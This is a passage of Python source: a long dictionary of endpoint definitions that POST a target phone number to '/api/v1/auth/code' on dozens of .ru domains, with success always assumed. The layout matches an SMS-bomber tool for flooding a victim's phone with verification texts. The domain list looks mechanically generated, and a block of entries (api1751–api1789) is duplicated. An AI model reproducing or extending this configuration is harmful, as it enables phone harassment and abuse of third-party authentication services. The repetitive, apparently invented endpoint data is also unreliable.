        "headers": lambda: get_common_headers("https://berezovo.ru/", "https://berezovo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1739": {
        "name": "BeloyarskyUni",
        "url": "https://beloyarsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://beloyarsky.ru/", "https://beloyarsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1740": {
        "name": "SovetskyUni",
        "url": "https://sovetsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sovetsky.ru/", "https://sovetsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1741": {
        "name": "KondaUni",
        "url": "https://konda.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://konda.ru/", "https://konda.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1742": {
        "name": "OktyabrskyUni",
        "url": "https://oktyabrsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oktyabrsky.ru/", "https://oktyabrsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1743": {
        "name": "NizhnevartovskyUni",
        "url": "https://nizhnevartovsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nizhnevartovsky.ru/", "https://nizhnevartovsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1744": {
        "name": "SurgutskyUni",
        "url": "https://surgutsky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://surgutsky.ru/", "https://surgutsky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1745": {
        "name": "NefteyuganskyUni",
        "url": "https://nefteyugansky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nefteyugansky.ru/", "https://nefteyugansky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1746": {
        "name": "KhantyMansiyskyUni",
        "url": "https://khanty-mansiysky.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://khanty-mansiysky.ru/", "https://khanty-mansiysky.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1747": {
        "name": "BeloyarskyDistrictUni",
        "url": "https://beloyarsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://beloyarsky-district.ru/", "https://beloyarsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1748": {
        "name": "BerezovskyDistrictUni",
        "url": "https://berezovsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://berezovsky-district.ru/", "https://berezovsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1749": {
        "name": "SovetskyDistrictUni",
        "url": "https://sovetsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sovetsky-district.ru/", "https://sovetsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1750": {
        "name": "KondinskyDistrictUni",
        "url": "https://kondinsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kondinsky-district.ru/", "https://kondinsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1751": {
        "name": "OktyabrskyDistrictUni",
        "url": "https://oktyabrsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oktyabrsky-district.ru/", "https://oktyabrsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1752": {
        "name": "NizhnevartovskyDistrictUni",
        "url": "https://nizhnevartovsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nizhnevartovsky-district.ru/", "https://nizhnevartovsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1753": {
        "name": "SurgutskyDistrictUni",
        "url": "https://surgutsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://surgutsky-district.ru/", "https://surgutsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1754": {
        "name": "NefteyuganskyDistrictUni",
        "url": "https://nefteyugansky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nefteyugansky-district.ru/", "https://nefteyugansky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1755": {
        "name": "KhantyMansiyskyDistrictUni",
        "url": "https://khanty-mansiysky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://khanty-mansiysky-district.ru/", "https://khanty-mansiysky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1756": {
        "name": "YamalDistrictUni",
        "url": "https://yamal-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamal-district.ru/", "https://yamal-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1757": {
        "name": "NadymDistrictUni",
        "url": "https://nadym-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nadym-district.ru/", "https://nadym-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1758": {
        "name": "PurovskyDistrictUni",
        "url": "https://purovsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://purovsky-district.ru/", "https://purovsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1759": {
        "name": "KrasnoselkupskyDistrictUni",
        "url": "https://krasnoselkupsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krasnoselkupsky-district.ru/", "https://krasnoselkupsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1760": {
        "name": "ShuryshkarskyDistrictUni",
        "url": "https://shuryshkarsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shuryshkarsky-district.ru/", "https://shuryshkarsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1761": {
        "name": "PriuralskyDistrictUni",
        "url": "https://priuralsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://priuralsky-district.ru/", "https://priuralsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1762": {
        "name": "TazovskyDistrictSystemUni",
        "url": "https://tazovsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tazovsky-system.ru/", "https://tazovsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1763": {
        "name": "SalekhardSystemUni",
        "url": "https://salekhard-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://salekhard-system.ru/", "https://salekhard-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1764": {
        "name": "NovyUrengoySystemUni",
        "url": "https://novy-urengoy-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novy-urengoy-system.ru/", "https://novy-urengoy-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1765": {
        "name": "NoyabrskSystemUni",
        "url": "https://noyabrsk-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://noyabrsk-system.ru/", "https://noyabrsk-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1766": {
        "name": "GubkinskySystemUni",
        "url": "https://gubkinsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gubkinsky-system.ru/", "https://gubkinsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1767": {
        "name": "LabytnangiSystemUni",
        "url": "https://labytnangi-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://labytnangi-system.ru/", "https://labytnangi-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1768": {
        "name": "MuravlenkoSystemUni",
        "url": "https://muravlenko-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://muravlenko-system.ru/", "https://muravlenko-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1769": {
        "name": "RaduzhnySystemUni",
        "url": "https://raduzhny-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://raduzhny-system.ru/", "https://raduzhny-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1770": {
        "name": "MegionSystemUni",
        "url": "https://megion-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megion-system.ru/", "https://megion-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1771": {
        "name": "LangepasSystemUni",
        "url": "https://langepas-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://langepas-system.ru/", "https://langepas-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1772": {
        "name": "PokachiSystemUni",
        "url": "https://pokachi-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pokachi-system.ru/", "https://pokachi-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1773": {
        "name": "UraySystemUni",
        "url": "https://uray-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uray-system.ru/", "https://uray-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1774": {
        "name": "NyaganSystemUni",
        "url": "https://nyagan-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nyagan-system.ru/", "https://nyagan-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1775": {
        "name": "BerezovoSystemUni",
        "url": "https://berezovo-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://berezovo-system.ru/", "https://berezovo-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1776": {
        "name": "BeloyarskySystemUni",
        "url": "https://beloyarsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://beloyarsky-system.ru/", "https://beloyarsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1777": {
        "name": "SovetskySystemUni",
        "url": "https://sovetsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sovetsky-system.ru/", "https://sovetsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1778": {
        "name": "KondaSystemUni",
        "url": "https://konda-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://konda-system.ru/", "https://konda-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1779": {
        "name": "OktyabrskySystemUni",
        "url": "https://oktyabrsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oktyabrsky-system.ru/", "https://oktyabrsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1780": {
        "name": "NizhnevartovskySystemUni",
        "url": "https://nizhnevartovsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nizhnevartovsky-system.ru/", "https://nizhnevartovsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1781": {
        "name": "SurgutskySystemUni",
        "url": "https://surgutsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://surgutsky-system.ru/", "https://surgutsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1782": {
        "name": "NefteyuganskySystemUni",
        "url": "https://nefteyugansky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nefteyugansky-system.ru/", "https://nefteyugansky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1783": {
        "name": "KhantyMansiyskySystemUni",
        "url": "https://khanty-mansiysky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://khanty-mansiysky-system.ru/", "https://khanty-mansiysky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1784": {
        "name": "YamalSystemUni",
        "url": "https://yamal-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamal-system.ru/", "https://yamal-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1785": {
        "name": "NadymSystemUni",
        "url": "https://nadym-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nadym-system.ru/", "https://nadym-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1786": {
        "name": "PurovskySystemUni",
        "url": "https://purovsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://purovsky-system.ru/", "https://purovsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1787": {
        "name": "KrasnoselkupskySystemUni",
        "url": "https://krasnoselkupsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krasnoselkupsky-system.ru/", "https://krasnoselkupsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1788": {
        "name": "ShuryshkarskySystemUni",
        "url": "https://shuryshkarsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shuryshkarsky-system.ru/", "https://shuryshkarsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1789": {
        "name": "PriuralskySystemUni",
        "url": "https://priuralsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://priuralsky-system.ru/", "https://priuralsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1790": {
        "name": "TazovskyGlobalUni",
        "url": "https://tazovsky-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tazovsky-global.ru/", "https://tazovsky-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1791": {
        "name": "SalekhardGlobalUni",
        "url": "https://salekhard-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://salekhard-global.ru/", "https://salekhard-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1792": {
        "name": "NovyUrengoyGlobalUni",
        "url": "https://novy-urengoy-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novy-urengoy-global.ru/", "https://novy-urengoy-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1793": {
        "name": "NoyabrskGlobalUni",
        "url": "https://noyabrsk-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://noyabrsk-global.ru/", "https://noyabrsk-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1794": {
        "name": "GubkinskyGlobalUni",
        "url": "https://gubkinsky-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gubkinsky-global.ru/", "https://gubkinsky-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1795": {
        "name": "LabytnangiGlobalUni",
        "url": "https://labytnangi-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://labytnangi-global.ru/", "https://labytnangi-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1796": {
        "name": "MuravlenkoGlobalUni",
        "url": "https://muravlenko-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://muravlenko-global.ru/", "https://muravlenko-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1797": {
        "name": "RaduzhnyGlobalUni",
        "url": "https://raduzhny-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://raduzhny-global.ru/", "https://raduzhny-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1798": {
        "name": "MegionGlobalUni",
        "url": "https://megion-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megion-global.ru/", "https://megion-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1799": {
        "name": "LangepasGlobalUni",
        "url": "https://langepas-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://langepas-global.ru/", "https://langepas-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1800": {
        "name": "PokachiGlobalUni",
        "url": "https://pokachi-global.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pokachi-global.ru/", "https://pokachi-global.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1751": {
        "name": "OktyabrskyDistrictUni",
        "url": "https://oktyabrsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oktyabrsky-district.ru/", "https://oktyabrsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1752": {
        "name": "NizhnevartovskyDistrictUni",
        "url": "https://nizhnevartovsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nizhnevartovsky-district.ru/", "https://nizhnevartovsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1753": {
        "name": "SurgutskyDistrictUni",
        "url": "https://surgutsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://surgutsky-district.ru/", "https://surgutsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1754": {
        "name": "NefteyuganskyDistrictUni",
        "url": "https://nefteyugansky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nefteyugansky-district.ru/", "https://nefteyugansky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1755": {
        "name": "KhantyMansiyskyDistrictUni",
        "url": "https://khanty-mansiysky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://khanty-mansiysky-district.ru/", "https://khanty-mansiysky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1756": {
        "name": "YamalDistrictUni",
        "url": "https://yamal-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamal-district.ru/", "https://yamal-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1757": {
        "name": "NadymDistrictUni",
        "url": "https://nadym-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nadym-district.ru/", "https://nadym-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1758": {
        "name": "PurovskyDistrictUni",
        "url": "https://purovsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://purovsky-district.ru/", "https://purovsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1759": {
        "name": "KrasnoselkupskyDistrictUni",
        "url": "https://krasnoselkupsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krasnoselkupsky-district.ru/", "https://krasnoselkupsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1760": {
        "name": "ShuryshkarskyDistrictUni",
        "url": "https://shuryshkarsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shuryshkarsky-district.ru/", "https://shuryshkarsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1761": {
        "name": "PriuralskyDistrictUni",
        "url": "https://priuralsky-district.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://priuralsky-district.ru/", "https://priuralsky-district.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1762": {
        "name": "TazovskyDistrictSystemUni",
        "url": "https://tazovsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tazovsky-system.ru/", "https://tazovsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1763": {
        "name": "SalekhardSystemUni",
        "url": "https://salekhard-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://salekhard-system.ru/", "https://salekhard-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1764": {
        "name": "NovyUrengoySystemUni",
        "url": "https://novy-urengoy-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novy-urengoy-system.ru/", "https://novy-urengoy-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1765": {
        "name": "NoyabrskSystemUni",
        "url": "https://noyabrsk-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://noyabrsk-system.ru/", "https://noyabrsk-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1766": {
        "name": "GubkinskySystemUni",
        "url": "https://gubkinsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gubkinsky-system.ru/", "https://gubkinsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1767": {
        "name": "LabytnangiSystemUni",
        "url": "https://labytnangi-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://labytnangi-system.ru/", "https://labytnangi-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1768": {
        "name": "MuravlenkoSystemUni",
        "url": "https://muravlenko-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://muravlenko-system.ru/", "https://muravlenko-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1769": {
        "name": "RaduzhnySystemUni",
        "url": "https://raduzhny-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://raduzhny-system.ru/", "https://raduzhny-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1770": {
        "name": "MegionSystemUni",
        "url": "https://megion-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megion-system.ru/", "https://megion-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1771": {
        "name": "LangepasSystemUni",
        "url": "https://langepas-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://langepas-system.ru/", "https://langepas-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1772": {
        "name": "PokachiSystemUni",
        "url": "https://pokachi-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pokachi-system.ru/", "https://pokachi-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1773": {
        "name": "UraySystemUni",
        "url": "https://uray-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uray-system.ru/", "https://uray-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1774": {
        "name": "NyaganSystemUni",
        "url": "https://nyagan-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nyagan-system.ru/", "https://nyagan-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1775": {
        "name": "BerezovoSystemUni",
        "url": "https://berezovo-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://berezovo-system.ru/", "https://berezovo-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1776": {
        "name": "BeloyarskySystemUni",
        "url": "https://beloyarsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://beloyarsky-system.ru/", "https://beloyarsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1777": {
        "name": "SovetskySystemUni",
        "url": "https://sovetsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sovetsky-system.ru/", "https://sovetsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1778": {
        "name": "KondaSystemUni",
        "url": "https://konda-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://konda-system.ru/", "https://konda-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1779": {
        "name": "OktyabrskySystemUni",
        "url": "https://oktyabrsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://oktyabrsky-system.ru/", "https://oktyabrsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1780": {
        "name": "NizhnevartovskySystemUni",
        "url": "https://nizhnevartovsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nizhnevartovsky-system.ru/", "https://nizhnevartovsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1781": {
        "name": "SurgutskySystemUni",
        "url": "https://surgutsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://surgutsky-system.ru/", "https://surgutsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1782": {
        "name": "NefteyuganskySystemUni",
        "url": "https://nefteyugansky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nefteyugansky-system.ru/", "https://nefteyugansky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1783": {
        "name": "KhantyMansiyskySystemUni",
        "url": "https://khanty-mansiysky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://khanty-mansiysky-system.ru/", "https://khanty-mansiysky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1784": {
        "name": "YamalSystemUni",
        "url": "https://yamal-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamal-system.ru/", "https://yamal-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1785": {
        "name": "NadymSystemUni",
        "url": "https://nadym-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nadym-system.ru/", "https://nadym-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1786": {
        "name": "PurovskySystemUni",
        "url": "https://purovsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://purovsky-system.ru/", "https://purovsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1787": {
        "name": "KrasnoselkupskySystemUni",
        "url": "https://krasnoselkupsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krasnoselkupsky-system.ru/", "https://krasnoselkupsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1788": {
        "name": "ShuryshkarskySystemUni",
        "url": "https://shuryshkarsky-system.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shuryshkarsky-system.ru/", "https://shuryshkarsky-system.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1789": {
        "name": "PriuralskySystemUni",
